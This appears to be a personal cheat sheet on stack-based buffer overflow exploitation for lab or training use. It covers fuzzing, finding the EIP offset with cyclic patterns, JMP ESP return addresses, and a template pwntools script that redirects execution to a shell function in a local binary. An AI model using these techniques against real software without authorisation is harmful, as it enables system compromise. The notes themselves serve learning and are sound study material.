# Stackbased Buffer Overflows

## Finding the vulnerability:
1. Source code review
	1. Find vulnerable functions
2. Fuzzing
	1.  Fuzz any input fields
3. Reverse Engineering
	1. Find vulnerable functions


## Fuzzing HTTP protocol
[Microsoft TCPView](https://docs.microsoft.com/en-us/sysinternals/downloads/tcpview) if debugger network listening does not work.

1. Use Wireshark to monitor traffic sent to application and follow TCP stream to show reply. 
2. Python PoC 
3. Run debugger Administrative priveleges attached to running of the vulnerable application

## Buffer Overflow Exploitation
Be aware alot of restarting required.
1. Enumerate till location EIP
	1. Binary Tree analysis - use pwntools `cyclic` or `msf-pattern_create -l $int`
	2. Update PoC
1. Check offset with `msfpattern_offset -l $int -q $offsetpattern` or pwntools `offset`. From EIP the offset is located at relative memory address higher than EIP - closer to 0x0!.
	1. Add EIP variable to find exact EIP address.
1. Locating space for shellcode
1. Check for bad characters
1. Redirect the execution to flow:
	
Due address changing either due crashing-and-restarting application or ASLR ... we can just hardcode a static return address in general in modern binary exploitation.

6. Find a return address
7. Leverage a static address that contains a `JMP ESP`
	1. Must be static - no libraries compiled with ASLR support
	2. Not an address within the region to be occupied by the shellcode

## pwntools
Enumeration
```bash
r < <(cyclic $INT) # cyclic input of $INT amount
cyclic -l EIP_Address # find out the amount of bytes of input need to expploit the binary
disassemble shell # find out where the shell function is in memory to set it to IP
# EITHER
# IF MANUAL WAY REMEMBER CORRECT ADDRESS LENGTH AND ENDIANNESS
# L->R = littleEndian; R->L = bigEndian
python -c 'print "A"*$INT + "$ADDR"' | /vuln/bin
python -c 'import struct;print "A"*44 + struct.pack("< ", $ADDR)' | /vuln/bin
```

Scripting the buffer overflow
```
from pwn import *
proc = process('/vuln/bin')
elf = ELF('/vuln/bin')
shell_func = elf.symbols.shell # CHANGE WHATEVER FORMAT REQUIRED
payload = fit({$INT: shell_func })
proc.sendline(payload)
proc.interactive()
```
